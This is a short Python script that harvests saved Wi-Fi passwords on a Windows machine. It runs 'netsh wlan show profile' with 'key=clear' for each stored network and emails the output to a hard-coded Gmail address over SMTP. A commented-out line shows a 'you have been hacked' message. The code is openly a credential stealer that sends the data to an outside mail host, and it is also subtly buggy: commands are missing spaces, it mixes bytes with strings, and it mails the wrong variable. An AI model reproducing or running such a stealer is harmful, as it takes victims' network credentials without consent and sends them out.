#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Mon Aug 17 16:48:54 2020

@author: djmaan
"""


import subprocess, smtplib, re

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()
    
#command = "msg * you have been hacked"
command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell = True)
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)

result = ""
for network_name in network_names_list:
    # print(network_name)
    command = "netsh wlan show profile" + network_name + "key =clear"
    current_result = subprocess.check_output(command, shell = True)
    result = result + current_result
send_mail("jhnwck70@gmail.com", 12345678,networks)